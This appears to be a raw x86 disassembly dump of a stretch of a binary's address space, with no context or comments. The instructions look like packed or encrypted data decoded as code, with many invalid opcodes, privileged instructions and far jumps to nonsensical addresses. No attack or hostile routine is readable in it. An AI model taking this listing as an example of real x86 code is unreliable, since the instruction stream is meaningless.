  41b9ee:	mov    ah,0x6b
  41b9f0:	sahf   
  41b9f1:	(bad)  
  41b9f3:	xchg   ebx,eax
  41b9f4:	jmp    0x41b99b
  41b9f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9f7:	and    BYTE PTR [edi-0x2bed2467],dh
  41b9fd:	cdq    
  41b9fe:	(bad)  
  41b9ff:	cmp    BYTE PTR ds:0x36a3686c,ah
  41ba05:	cld    
  41ba06:	ror    BYTE PTR [edx+ebp*1],0x65
  41ba0a:	adc    ebp,edi
  41ba0c:	cdq    
  41ba0d:	call   0xff10:0x8dfc33c9
  41ba14:	mov    bl,0xcf
  41ba16:	sbb    al,0x46
  41ba18:	and    DWORD PTR [eax-0x7d8ebd9e],esp
  41ba1e:	fmul   DWORD PTR [ecx+edi*8-0x70ee66aa]
  41ba25:	sysret 
  41ba27:	rcr    BYTE PTR [edi+edx*8+0x46],0x41
  41ba2c:	ss pop ebp
  41ba2e:	push   cs
  41ba2f:	push   ebp
  41ba30:	call   esp
  41ba32:	push   0x4f
  41ba34:	icebp  
  41ba35:	mov    esp,edx
  41ba37:	retf   
  41ba38:	cmp    DWORD PTR [eax+0x25182802],esi
  41ba3e:	xor    al,0xd3
  41ba40:	inc    ebx
  41ba41:	mov    ecx,DWORD PTR [ebx+0x7d]
  41ba44:	add    al,0x69
  41ba46:	xchg   ebp,eax
  41ba47:	xor    al,0x4d
  41ba49:	mov    dl,0x3d
  41ba4b:	sahf   
  41ba4c:	je     0x41b9d7
  41ba4e:	pop    edi
  41ba4f:	test   BYTE PTR [ecx],cl
  41ba51:	push   ebx
  41ba52:	or     al,0x6f
  41ba54:	retf   0x85c
  41ba57:	lds    edi,FWORD PTR [eax+0x7877c4b6]
  41ba5d:	mov    al,ds:0x6ea20a42
  41ba62:	mov    ds:0x61d7b30b,al
  41ba67:	lock or eax,0x7ce57ef0
  41ba6d:	hlt    
  41ba6e:	pop    esi
  41ba6f:	sub    eax,0x618ef961
  41ba74:	out    dx,eax
  41ba75:	mov    ds:0x76d62bc,al
  41ba7a:	add    DWORD PTR [eax],ebp
  41ba7c:	mov    dh,0x28
  41ba7e:	popa   
  41ba7f:	add    al,0x67
  41ba81:	dec    eax
  41ba82:	inc    esi
  41ba83:	jp     0x41ba05
  41ba85:	add    ah,0xb0
  41ba88:	and    ebp,DWORD PTR [edi+ebx*4-0x60]
  41ba8c:	das    
  41ba8d:	pop    ecx
  41ba8e:	cmp    al,ch
  41ba90:	aas    
  41ba91:	inc    edx
  41ba92:	dec    esi
  41ba93:	lock cmp DWORD PTR [esi+edx*4+0x3a51df93],edx
  41ba9b:	(bad)  
  41ba9c:	mov    ebx,0xb85ce14b
  41baa1:	test   eax,0xfdffa0b6
  41baa6:	scas   al,BYTE PTR es:[edi]
  41baa7:	push   edx
  41baa8:	push   ds
  41baa9:	(bad)  
  41baaa:	repz in al,0x3e
  41baad:	push   esi
  41baae:	push   es
  41baaf:	xadd   DWORD PTR [edx+0x72494400],edx
  41bab6:	jnp    0x41bb00
  41bab8:	xor    BYTE PTR [eax],dh
  41baba:	out    dx,al
  41babb:	mov    cs,WORD PTR [esi+ecx*4+0x4390f79c]
  41bac2:	lods   al,BYTE PTR ds:[esi]
  41bac3:	push   ss
  41bac4:	push   ds
  41bac5:	data16 je 0x41bb22
  41bac8:	xchg   edx,eax
  41bac9:	sub    al,0xd4
  41bacb:	dec    edx
  41bacc:	sar    dh,cl
  41bace:	aam    0x9f
  41bad0:	ret    0x7df7
  41bad3:	fcomp  DWORD PTR [esi]
  41bad5:	inc    ecx
  41bad6:	adc    BYTE PTR [eax-0xf],0xee
  41bada:	int3   
  41badb:	(bad)  
  41badc:	xchg   edx,eax
  41badd:	ss dec bp
  41bae0:	scas   al,BYTE PTR es:[edi]
  41bae1:	in     al,0xda
  41bae3:	iret   
  41bae4:	ja     0x41bafc
  41bae6:	sbb    BYTE PTR [eax+edx*2+0xbd7639],0xe4
  41baee:	data16 cmc 
  41baf0:	xor    DWORD PTR [edx-0x7a855a0],0xffffff8a
  41baf7:	out    0x11,eax
  41baf9:	shr    esi,0xba
  41bafc:	xor    eax,0xbccb38db
  41bb01:	stc    
  41bb02:	push   es
  41bb03:	xor    al,0xea
  41bb05:	fwait
  41bb06:	leave  
  41bb07:	jp     0x41bb4f
  41bb09:	add    BYTE PTR [ebp+ecx*8+0x5f87e82e],dl
  41bb10:	or     eax,0xd1f67eeb
  41bb15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb16:	mov    WORD PTR [edi],ss
  41bb18:	adc    ecx,DWORD PTR [ecx+ebx*2-0x392100fc]
  41bb1f:	or     BYTE PTR [ecx],ch
  41bb21:	loop   0x41bae9
  41bb23:	gs push ss
  41bb25:	push   0x17dea414
  41bb2a:	jl     0x41bb7c
  41bb2c:	aad    0x29
  41bb2e:	bound  esp,QWORD PTR [ebp+ecx*2-0x6]
  41bb32:	cli    
  41bb33:	fldcw  WORD PTR [ecx+0x2b]
  41bb36:	in     eax,dx
  41bb37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb38:	idiv   esp
  41bb3a:	mov    dl,BYTE PTR [edi+0x10]
  41bb3d:	adc    BYTE PTR [ecx+esi*1],al
  41bb40:	loope  0x41bb97
  41bb42:	inc    edx
  41bb43:	test   al,0xa9
  41bb45:	or     al,0x43
  41bb47:	ret    0x48c7
  41bb4a:	(bad)  
  41bb4b:	lea    eax,ds:0x488945e0
  41bb51:	call   0x7e97:0xf9f84e57
  41bb58:	mov    bl,0x6a
  41bb5a:	in     eax,0xc7
  41bb5c:	push   DWORD PTR [esi]
  41bb5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb5f:	jmp    0x857122f9
  41bb64:	out    dx,al
  41bb65:	fisttp WORD PTR [edx]
  41bb67:	mov    ah,0x73
  41bb69:	jmp    0x87e8:0x3b747763
  41bb70:	call   0x73c3:0x438037d3
  41bb77:	ret    
  41bb78:	neg    BYTE PTR [edx+0x4b]
  41bb7b:	js     0x41bbf5
  41bb7d:	mov    dl,0xf9
  41bb7f:	das    
  41bb80:	sub    DWORD PTR [edx],edi
  41bb82:	and    al,0x49
  41bb84:	dec    esp
  41bb85:	loopne 0x41bb5f
  41bb87:	sbb    DWORD PTR [eax],edx
  41bb89:	pop    edi
  41bb8a:	retf   
  41bb8b:	out    dx,eax
  41bb8c:	addr16 mov eax,ds:0xea3f
  41bb90:	and    DWORD PTR [esi],0xb6460e9d
  41bb96:	leave  
  41bb97:	les    ecx,FWORD PTR [ecx+0x6a72945d]
  41bb9d:	and    BYTE PTR [edi+0x14],bh
  41bba0:	push   esp
  41bba1:	xchg   edi,eax
  41bba2:	(bad)  [ecx+ecx*4]
  41bba5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bba7:	pop    eax
  41bba8:	push   ebx
  41bba9:	add    ebp,ecx
  41bbab:	mov    bh,0x31
  41bbad:	mov    esi,0x1da66ca7
  41bbb2:	adc    DWORD PTR [ecx-0x441b1746],esp
  41bbb8:	mov    ds:0x2a07acf0,al
  41bbbd:	jmp    0x41bbec
  41bbbf:	fmul   st,st(0)
  41bbc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbc2:	cmp    bl,0x16
  41bbc5:	xchg   ebp,eax
  41bbc6:	dec    ecx
  41bbc7:	pop    esi
  41bbc8:	lods   eax,DWORD PTR ds:[esi]
  41bbc9:	fnstcw WORD PTR [ebp+edx*2-0x33eb7d73]
  41bbd0:	adc    ch,ch
  41bbd2:	mov    bh,BYTE PTR [edi-0x2ba0e24a]
  41bbd8:	sbb    edx,DWORD PTR ds:[edx]
  41bbdb:	call   0x2d04:0x99c245f6
  41bbe2:	retf   0x85f4
  41bbe5:	push   0x3a
  41bbe7:	test   al,0xf9
  41bbe9:	adc    al,0xb2
  41bbeb:	sub    bh,BYTE PTR [edx+0x4b]
  41bbee:	pop    es
  41bbef:	mov    al,BYTE PTR [ebx-0x2e]
  41bbf2:	pop    ebp
  41bbf3:	xchg   edx,eax
  41bbf4:	and    al,0xbf
  41bbf6:	cmp    BYTE PTR [ecx-0x50457b11],dl
  41bbfc:	inc    esp
  41bbfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbfe:	mov    ah,0x6f
  41bc00:	dec    esp
  41bc01:	ret    
  41bc02:	adc    al,BYTE PTR [edi]
  41bc04:	jb     0x41bc3a
  41bc06:	jle    0x41bc1c
  41bc08:	in     eax,0xf5
  41bc0a:	sbb    ebx,DWORD PTR [eax-0x7317fac5]
  41bc10:	into   
  41bc11:	js     0x41bbe2
  41bc13:	(bad)  
  41bc14:	pop    ebx
  41bc15:	mov    cl,0xb2
  41bc17:	xlat   BYTE PTR ds:[ebx]
  41bc18:	popa   
  41bc19:	mov    dh,0xfa
  41bc1b:	add    al,0x92
  41bc1d:	sub    DWORD PTR [edx+eax*1+0x6ad8a6a8],eax
  41bc24:	sbb    ebp,DWORD PTR [eax*4-0x34311cb]
  41bc2b:	rcr    DWORD PTR [ebx-0x2],cl
  41bc2e:	ret    
  41bc2f:	test   eax,0xe66df290
  41bc34:	in     eax,dx
  41bc35:	adc    ebx,ebx
  41bc37:	jne    0x41bc40
  41bc39:	mov    eax,ds:0x7e76e937
  41bc3e:	cmp    cl,BYTE PTR [edi-0x5b]
  41bc41:	dec    ebp
  41bc42:	pop    ebx
  41bc43:	inc    ebx
  41bc44:	add    BYTE PTR [ecx],0x74
  41bc47:	xchg   edx,eax
  41bc48:	add    cl,dh
  41bc4a:	gs jmp 0xfb9d9371
  41bc50:	adc    al,0x9a
  41bc52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc53:	cmp    bl,BYTE PTR [ebp+0x2d]
  41bc56:	ins    DWORD PTR es:[edi],dx
  41bc57:	cmp    al,0xaa
  41bc59:	call   0x24183cc0
  41bc5e:	fnstsw WORD PTR [edi-0x67]
  41bc61:	push   ebx
  41bc62:	mov    WORD PTR [edx-0xe5bafd5],gs
  41bc68:	sub    al,0x1
  41bc6a:	push   esi
  41bc6b:	jnp    0x41bc62
  41bc6d:	add    BYTE PTR [esi-0x6ec290b2],cl
  41bc73:	call   0x795e:0xbd33d985
  41bc7a:	mov    eax,ds:0x92f40b
  41bc7f:	call   0xbb6b:0x9b639e5b
  41bc86:	call   0xe06cd416
  41bc8b:	xor    cl,bh
  41bc8d:	retf   
  41bc8e:	in     al,0x81
  41bc90:	push   eax
  41bc91:	scas   eax,DWORD PTR es:[edi]
  41bc92:	and    cl,BYTE PTR [ebp-0x676d2fb1]
  41bc98:	pop    ds
  41bc99:	jg     0x41bd16
  41bc9b:	sub    ecx,DWORD PTR [edi-0x20ede912]
  41bca1:	push   0x7a
  41bca3:	sti    
  41bca4:	ret    
  41bca5:	imul   esi,DWORD PTR [ebp-0x4a],0x22
  41bca9:	stos   DWORD PTR es:[edi],eax
  41bcaa:	pop    edi
  41bcab:	jmp    0xf5f5a271
  41bcb0:	cmp    ebx,eax
  41bcb2:	push   ebp
  41bcb3:	cmp    esp,DWORD PTR [ebx+edx*1]
  41bcb6:	aad    0x44
  41bcb8:	push   esp
  41bcb9:	jg     0x41bc50
  41bcbb:	sbb    al,0x73
  41bcbd:	outs   dx,BYTE PTR ds:[esi]
  41bcbe:	fwait
  41bcbf:	xchg   ebx,eax
  41bcc0:	jg     0x41bcdf
  41bcc2:	mov    bh,0x70
  41bcc4:	gs retf 
  41bcc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcc7:	dec    ebx
  41bcc8:	loop   0x41bc4f
  41bcca:	ret    0xf253
  41bccd:	pop    eax
  41bcce:	jmp    0x6c6745a4
  41bcd3:	xor    DWORD PTR [eax+0x0],ebp
  41bcd6:	push   esi
  41bcd7:	outs   dx,DWORD PTR ds:[esi]
  41bcd8:	or     ebp,edx
  41bcda:	retf   0xdc83
  41bcdd:	jae    0x41bc9a
  41bcdf:	retf   0x203b
  41bce2:	mov    ebp,0x2723c3ca
  41bce7:	sub    ah,BYTE PTR [ecx-0x70aef621]
  41bced:	mov    edi,0xedf8ca68
  41bcf2:	sar    DWORD PTR [ecx],cl
  41bcf4:	xchg   ecx,eax
  41bcf5:	fcomp  DWORD PTR [eax]
  41bcf7:	scas   eax,DWORD PTR es:[edi]
  41bcf8:	xchg   DWORD PTR [edi+edx*8+0x2f],eax
  41bcfc:	pop    es
  41bcfd:	cmp    eax,0x6ae855ce
  41bd02:	mov    ds:0xf4c98508,al
  41bd07:	fmul   st,st(0)
  41bd09:	jno    0x41bd39
  41bd0b:	fs pop eax
  41bd0d:	rcr    BYTE PTR [edi+0x2c],1
  41bd10:	pop    edi
  41bd11:	cmp    esp,ebp
  41bd13:	ja     0x41bd71
  41bd15:	aam    0x58
  41bd17:	mov    BYTE PTR [ebx-0x12de5a12],0xbe
  41bd1e:	das    
  41bd1f:	push   ecx
  41bd20:	out    dx,al
  41bd21:	das    
  41bd22:	push   eax
  41bd23:	mov    esi,0x4c58d22c
  41bd28:	in     eax,0xee
  41bd2a:	dec    edx
  41bd2b:	imul   esp,DWORD PTR [edi-0xc5dcd18],0x28f75e94
  41bd35:	dec    edx
  41bd36:	add    DWORD PTR [eax],edi
  41bd38:	cmp    esi,DWORD PTR [edi+eax*2+0xb30cf55]
  41bd3f:	or     BYTE PTR [eax-0x3f272dd6],al
  41bd45:	shr    BYTE PTR [ebp*4+0x40fecc92],1
  41bd4c:	jae    0x41bd7a
  41bd4e:	iret   
  41bd4f:	inc    eax
  41bd50:	jl     0x41bce3
  41bd52:	mov    gs,ebx
  41bd54:	mov    DWORD PTR [ebp+0x5a],0xaf7adb40
  41bd5b:	adc    DWORD PTR [edx-0xcf39563],ebp
  41bd61:	sub    DWORD PTR [edi+edi*2],esi
  41bd64:	cwde   
  41bd65:	xlat   BYTE PTR ds:[ebx]
  41bd66:	pop    esp
  41bd67:	stos   DWORD PTR es:[edi],eax
  41bd68:	outs   dx,DWORD PTR ds:[esi]
  41bd69:	mov    eax,0xdfcf3156
  41bd6e:	cmp    DWORD PTR [edx],0x6a3a0b6c
  41bd74:	cwde   
  41bd75:	mov    dl,0xc3
  41bd77:	pop    ds
  41bd78:	xchg   ebx,eax
  41bd79:	cli    
  41bd7a:	dec    esi
  41bd7b:	pop    ebx
  41bd7c:	adc    dh,al
  41bd7e:	ret    
  41bd7f:	inc    edx
  41bd80:	sbb    edi,DWORD PTR [edx-0x416dca43]
  41bd86:	sbb    eax,0xc54d3eaa
  41bd8b:	push   ss
  41bd8c:	clc    
  41bd8d:	jae    0x41bd5d
  41bd8f:	fwait
  41bd90:	imul   esp,DWORD PTR ds:0x734edb7f,0x620497d8
  41bd9a:	int3   
  41bd9b:	xchg   edi,eax
  41bd9c:	mov    ebx,0x6add6fc
  41bda1:	aad    0x9d
  41bda3:	iret   
  41bda4:	jae    0x41be05
  41bda6:	fild   WORD PTR [esp+ebx*1-0xe]
  41bdaa:	xchg   esp,eax
  41bdab:	mov    bl,0xaf
  41bdad:	pop    ebx
  41bdae:	push   es
  41bdaf:	cld    
  41bdb0:	fsub   QWORD PTR [edi-0x10]
  41bdb3:	mov    ch,0x17
  41bdb5:	cwde   
  41bdb6:	cmc    
  41bdb7:	in     al,dx
  41bdb8:	popa   
  41bdb9:	scas   al,BYTE PTR es:[edi]
  41bdba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdbb:	jbe    0x41bd96
  41bdbd:	jge    0x41bd9f
  41bdbf:	rol    BYTE PTR [ebp-0x76],1
  41bdc2:	sti    
  41bdc3:	mov    DWORD PTR [edi],edx
  41bdc5:	aas    
  41bdc6:	and    edx,DWORD PTR [esi-0xf]
  41bdc9:	repnz neg DWORD PTR [edi]
  41bdcc:	sbb    esi,ecx
  41bdce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdcf:	(bad)  
  41bdd0:	pop    ebx
  41bdd1:	int3   
  41bdd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdd3:	inc    ecx
  41bdd4:	xchg   ebx,eax
  41bdd5:	std    
  41bdd6:	xchg   esp,eax
  41bdd7:	xchg   ebp,eax
  41bdd8:	mov    cl,0x99
  41bdda:	std    
  41bddb:	push   eax
  41bddc:	rcl    DWORD PTR [edi],0xa4
  41bddf:	jmp    0x5cc845d9
  41bde4:	jb     0x41bdd8
  41bde6:	xchg   esp,eax
  41bde7:	mov    bl,0x8
  41bde9:	xlat   BYTE PTR ds:[ebx]
  41bdea:	or     edi,edi
  41bdec:	pop    ss
  41bded:	push   cs
  41bdee:	(bad)  
  41bdef:	aas    
  41bdf0:	scas   eax,DWORD PTR es:[edi]
  41bdf1:	mov    ecx,0xb78529e6
  41bdf6:	and    esi,eax
  41bdf8:	repnz cwde 
  41bdfa:	(bad)  
  41bdfb:	jmp    0x8654e86c
  41be00:	repnz sub DWORD PTR [edx],edi
  41be03:	mov    ds:0xaabde855,al
  41be08:	xchg   DWORD PTR [esp+ebp*8],edi
  41be0b:	imul   ebp,edx,0xec606d64
  41be11:	mov    eax,ds:0x4d9752ce
  41be16:	seto   BYTE PTR [esp+ebx*1-0x13fdbe57]
  41be1e:	sbb    edx,eax
  41be20:	and    eax,0x8a37277b
  41be25:	rcl    edi,0xc
  41be28:	retf   
  41be29:	jmp    0x40c653d6
  41be2e:	or     al,0x7f
  41be30:	pop    esp
  41be31:	or     DWORD PTR [ebp-0x53ac62d6],eax
  41be37:	enter  0x4315,0xdf
  41be3b:	repz jb 0x41beaf
  41be3e:	add    al,0x3d
  41be40:	jo     0x41be59
  41be42:	ja     0x41be9e
  41be44:	ja     0x41be50
  41be46:	cli    
  41be47:	push   ds
  41be48:	pop    DWORD PTR [ebp+0x78]
  41be4b:	xchg   esi,eax
  41be4c:	test   DWORD PTR [edx-0x26],esi
  41be4f:	and    ch,BYTE PTR [edi-0x209eabf3]
  41be55:	test   BYTE PTR [esi-0x10],0x82
  41be59:	aad    0x9c
  41be5b:	addr16 retf 0xe0e5
  41be5f:	sub    al,0xf2
  41be61:	fcmovu st,st(2)
  41be63:	add    al,0x1f
  41be65:	push   es
  41be66:	mov    bl,0xb1
  41be68:	dec    ecx
  41be69:	out    0x23,eax
  41be6b:	and    edx,0x363f05ad
  41be71:	pop    esi
  41be72:	sbb    ecx,edi
  41be74:	jl     0x41be9e
  41be76:	sub    al,0x9f
  41be78:	cmp    edi,DWORD PTR [eax-0x69]
  41be7b:	inc    esi
  41be7c:	jnp    0x41be8f
  41be7e:	cli    
  41be7f:	aam    0x11
  41be81:	push   ecx
  41be82:	jns    0x41be3e
  41be84:	dec    ecx
  41be85:	cmp    BYTE PTR ds:0x53683da3,cl
  41be8b:	jg     0x41be1d
  41be8d:	repnz das 
  41be8f:	and    eax,0x8c97ec92
  41be94:	fdivp  st(7),st
  41be96:	in     eax,0x94
  41be98:	jle    0x41be6c
  41be9a:	sbb    al,0x6d
  41be9c:	pop    esp
  41be9d:	fs out 0x61,al
  41bea0:	xor    DWORD PTR [edi],0xb108e196
  41bea6:	add    DWORD PTR [ebx+0xbcf1ef7],0xf30837ac
  41beb0:	je     0x41be84
  41beb2:	fisub  WORD PTR [eax-0x2f50ea50]
  41beb8:	bound  edi,QWORD PTR [ecx+edx*4+0x6a]
  41bebc:	sub    DWORD PTR [ebx],0x281a4f17
  41bec2:	aaa    
  41bec3:	daa    
  41bec4:	outs   dx,DWORD PTR ds:[esi]
  41bec5:	dec    esi
  41bec6:	xchg   ebx,eax
  41bec7:	(bad)  
  41bec8:	or     DWORD PTR [edi+0x11dafa09],esp
  41bece:	add    ecx,DWORD PTR [ebx-0x69316ccd]
  41bed4:	out    dx,eax
  41bed5:	sbb    edx,DWORD PTR [ebx]
  41bed7:	ins    BYTE PTR es:[edi],dx
  41bed8:	neg    DWORD PTR [ecx+ecx*4-0x2b]
  41bedc:	mov    bh,0xa
  41bede:	push   edi
  41bedf:	push   edx
  41bee0:	rep outs dx,DWORD PTR ds:[esi]
  41bee2:	js     0x41bead
  41bee4:	aam    0x16
  41bee6:	xor    al,0x9e
  41bee8:	ins    DWORD PTR es:[edi],dx
  41bee9:	mov    bl,0x2e
  41beeb:	push   esi
  41beec:	mov    eax,0xd12d5d32
  41bef1:	xchg   esp,eax
  41bef2:	popa   
  41bef3:	es cwde 
  41bef5:	sub    bh,dh
  41bef7:	imul   BYTE PTR [edx+0x1d09622a]
  41befd:	adc    DWORD PTR [edi+0x51],esi
  41bf00:	pop    ss
  41bf01:	shr    esi,1
  41bf03:	rcl    DWORD PTR [ecx+ecx*2],0xe0
  41bf07:	test   BYTE PTR [edx-0x35],ch
  41bf0a:	xchg   DWORD PTR [ecx],esi
  41bf0c:	xor    BYTE PTR [ebx],ch
  41bf0e:	push   edi
  41bf0f:	or     ch,dl
  41bf11:	or     esi,ecx
  41bf13:	test   BYTE PTR [ebx+0x528b904b],dh
  41bf19:	shl    BYTE PTR ds:0xe5b00e9b,0xae
  41bf20:	mov    eax,0xcb075360
  41bf25:	and    DWORD PTR [edi+0x34],edi
  41bf28:	add    bh,bh
  41bf2a:	repz aad 0x2a
  41bf2d:	adc    DWORD PTR [edi],esp
  41bf2f:	out    dx,eax
  41bf30:	mov    ecx,0x71b1bf62
  41bf35:	mov    dh,0xa5
  41bf37:	sbb    dh,BYTE PTR [ebp+ebx*2-0x33]
  41bf3b:	xor    eax,0xbd49ac5e
  41bf40:	adc    DWORD PTR [ebp+edi*2-0x3a55f5db],eax
  41bf47:	mov    cl,0x2f
  41bf49:	nop
  41bf4a:	retf   
  41bf4b:	push   edx
  41bf4c:	icebp  
  41bf4d:	jecxz  0x41bf4c
  41bf4f:	pop    ss
  41bf50:	adc    DWORD PTR [ebp-0x6f3a166],ebx
  41bf56:	jnp    0x41bfbe
  41bf58:	les    ecx,FWORD PTR [eax+eax*2-0x57b3693]
  41bf5f:	mov    bl,0xd
  41bf61:	pop    dx
  41bf63:	das    
  41bf64:	xchg   ecx,eax
  41bf65:	xor    DWORD PTR [ebp+0x2c],esi
  41bf68:	enter  0x7261,0xcc
  41bf6c:	aad    0x2e
  41bf6e:	(bad)  
  41bf6f:	pushf  
  41bf70:	sbb    BYTE PTR [ebx],dl
  41bf72:	mov    al,fs:0xc0024f53
  41bf78:	pop    esi
  41bf79:	add    DWORD PTR [eax+0x4c],edi
  41bf7c:	pop    ebp
  41bf7d:	mov    WORD PTR [edx],?
  41bf7f:	cmp    al,0xd5
  41bf81:	leave  
  41bf82:	xor    al,0x89
  41bf84:	or     al,0x89
  41bf86:	or     ebx,DWORD PTR [edi-0x1]
  41bf89:	xchg   ebp,eax
  41bf8a:	dec    eax
  41bf8b:	(bad)  
  41bf8c:	data16 out dx,al
  41bf8e:	add    al,0x78
  41bf90:	outs   dx,DWORD PTR ds:[esi]
  41bf91:	rcr    DWORD PTR [ebp-0x7b],1
  41bf94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf95:	push   ebx
  41bf96:	hlt    
  41bf97:	push   ds
  41bf98:	loope  0x41c013
  41bf9a:	xor    bh,dl
  41bf9c:	sbb    ebx,0x1c
  41bf9f:	(bad)  
  41bfa1:	add    eax,0xa92ddde6
  41bfa6:	nop
  41bfa7:	test   ecx,esp
  41bfa9:	(bad)  
  41bfaa:	sti    
  41bfab:	dec    edx
  41bfac:	repnz push 0xffffffa2
  41bfaf:	sub    DWORD PTR [ebx-0x308f01e3],ebp
  41bfb5:	or     edx,esi
  41bfb7:	push   0x6865af11
  41bfbc:	les    ebx,FWORD PTR gs:[edx+0x3f062f41]
  41bfc3:	in     al,dx
  41bfc4:	mov    cl,0x6a
  41bfc6:	add    bl,BYTE PTR [edi+0x1a]
  41bfc9:	add    BYTE PTR [edi],0x78
  41bfcc:	(bad)  
  41bfcd:	mov    bl,bh
  41bfcf:	in     eax,0x7e
  41bfd1:	push   esp
  41bfd2:	mov    BYTE PTR [edi+0x3c790726],dl
  41bfd8:	sti    
  41bfd9:	dec    ecx
  41bfda:	fucom  st(0)
  41bfdc:	sub    eax,0x87a664f8
  41bfe1:	push   eax
  41bfe2:	adc    al,0xfd
  41bfe4:	mov    esp,0x5651d14
  41bfe9:	in     eax,dx
  41bfea:	dec    esi
  41bfeb:	add    BYTE PTR [ecx],cl
  41bfed:	adc    ebp,ebp
  41bfef:	test   ah,dl
  41bff1:	sub    eax,eax
  41bff3:	aam    0x71
  41bff5:	add    edi,DWORD PTR [esi+0x7144f630]
  41bffb:	enter  0xf008,0x7b
  41bfff:	ror    BYTE PTR [edx-0x6b6887c3],cl
  41c005:	inc    esi
  41c006:	fwait
  41c007:	mov    esp,edx
  41c009:	repnz iret 
  41c00b:	pop    esi
  41c00c:	push   eax
  41c00d:	retf   0x3c81
  41c010:	jmp    0x41bfc3
  41c012:	pop    ss
  41c013:	test   eax,0xbb037942
  41c018:	ins    BYTE PTR es:[edi],dx
  41c019:	ins    BYTE PTR es:[edi],dx
  41c01a:	(bad)  [edx+0x5941f4d]
  41c020:	hlt    
  41c021:	dec    ebx
  41c022:	and    ecx,esp
  41c024:	push   cs
  41c025:	pop    edi
  41c026:	xchg   ebp,eax
  41c027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c028:	push   esp
  41c029:	fimul  DWORD PTR [ebx+0x3dd884fc]
  41c02f:	test   al,0x29
  41c031:	jl     0x41c05c
  41c033:	repnz and al,0xce
  41c036:	dec    edx
  41c037:	cmp    DWORD PTR [esi+0x30fdac5],0xa919071c
  41c041:	xchg   ebp,eax
  41c042:	fwait
  41c043:	out    0x12,eax
  41c045:	ficom  WORD PTR [ecx-0x46]
  41c048:	(bad)  
  41c049:	nop
  41c04a:	test   DWORD PTR [ebx+0x1d],ecx
  41c04d:	enter  0x8494,0xce
  41c051:	xchg   edi,eax
  41c052:	aad    0x70
  41c054:	jl     0x41c044
  41c056:	add    dl,BYTE PTR [ebx-0x1d]
  41c059:	test   DWORD PTR [ecx+0x1a],edi
  41c05c:	push   edi
  41c05d:	jge    0x41c05b
  41c05f:	ss sub eax,0x37593079
  41c065:	mov    ecx,0x77a6056f
  41c06a:	xchg   ebp,eax
  41c06b:	mov    cl,ah
  41c06d:	inc    esi
  41c06e:	inc    ebx
  41c06f:	mov    ch,0x14
  41c071:	test   BYTE PTR [edx-0x407b1749],bl
  41c077:	stc    
  41c078:	pop    esp
  41c079:	fldcw  WORD PTR [ebx]
  41c07b:	inc    ebx
  41c07c:	jmp    0x24b0:0x7597aefc
  41c083:	or     al,0x11
  41c085:	or     DWORD PTR ds:0xc5c1f221,ebp
  41c08b:	daa    
  41c08c:	jne    0x41c0da
  41c08e:	mov    al,ds:0x7dd73727
  41c093:	cmp    ch,BYTE PTR [edx+0x3f580e9]
  41c099:	cld    
  41c09a:	and    eax,0xdbdb0b2f
  41c09f:	call   0xfd8967a2
  41c0a4:	shl    BYTE PTR [edi-0x78],cl
  41c0a7:	pushf  
  41c0a8:	(bad)  
  41c0a9:	jmp    0x65a84506
  41c0ae:	je     0x41c0b3
  41c0b0:	mov    cl,0xab
  41c0b2:	(bad)  
  41c0b3:	fmul   DWORD PTR [ebx+0x2efb51ef]
  41c0b9:	shr    edx,0x18
  41c0bc:	fldz   
  41c0be:	jg     0x41c090
  41c0c0:	mov    ds:0x6f87c4d1,eax
  41c0c5:	mov    eax,0xe90f1b61
  41c0ca:	adc    esi,ecx
  41c0cc:	(bad)  
  41c0cd:	dec    ebx
  41c0ce:	es dec ecx
  41c0d0:	aam    0x3a
  41c0d2:	jne    0x41c082
  41c0d4:	and    edx,edi
  41c0d6:	or     bh,cl
  41c0d8:	mov    DWORD PTR [esi+0x7a],ecx
  41c0db:	ins    BYTE PTR es:[edi],dx
  41c0dc:	ret    
  41c0dd:	jle    0x41c123
  41c0df:	test   al,0x33
  41c0e1:	adc    ch,BYTE PTR [ebp+0x51]
  41c0e4:	push   edx
  41c0e5:	sbb    esi,esp
  41c0e7:	cmp    ah,BYTE PTR ss:[esi]
  41c0ea:	loope  0x41c0b7
  41c0ec:	dec    esi
  41c0ed:	cmp    BYTE PTR [edx],dl
  41c0ef:	and    al,0x35
  41c0f1:	js     0x41c0f7
  41c0f3:	mov    ds:0x12251d1d,eax
  41c0f8:	fsubr  DWORD PTR [ebp-0x3f357bb3]
  41c0fe:	mov    al,ds:0xb7ec2f96
  41c103:	leave  
  41c104:	xchg   ecx,eax
  41c105:	out    0x79,al
  41c107:	cs ins BYTE PTR es:[edi],dx
  41c109:	mov    bh,0x99
  41c10b:	push   cs
  41c10c:	and    al,0x76
  41c10e:	ret    
  41c10f:	jge    0x41c0f6
  41c111:	xlat   BYTE PTR ds:[ebx]
  41c112:	and    ch,BYTE PTR [ecx-0x17]
  41c115:	add    DWORD PTR [edi-0x6507a33],ebp
  41c11b:	arpl   WORD PTR [eax-0x300edaa9],dx
  41c121:	xor    DWORD PTR [ebx],esi
  41c123:	fisub  WORD PTR [ebp-0x3b96eace]
  41c129:	or     bh,BYTE PTR [edx]
  41c12b:	aas    
  41c12c:	jl     0x41c14f
  41c12e:	mov    al,0x73
  41c130:	in     al,0x0
  41c132:	push   eax
  41c133:	dec    ecx
  41c134:	test   esi,esi
  41c136:	fist   DWORD PTR [edx-0x6c]
  41c139:	inc    ebp
  41c13a:	cli    
  41c13b:	push   ebp
  41c13c:	jle    0x41c18d
  41c13e:	sahf   
  41c13f:	pop    ds
  41c140:	and    BYTE PTR [esi-0x33655eef],bh
  41c146:	out    0x49,al
  41c148:	add    eax,DWORD PTR [esi-0x26]
  41c14b:	ins    BYTE PTR es:[edi],dx
  41c14c:	popa   
  41c14d:	in     eax,0x2d
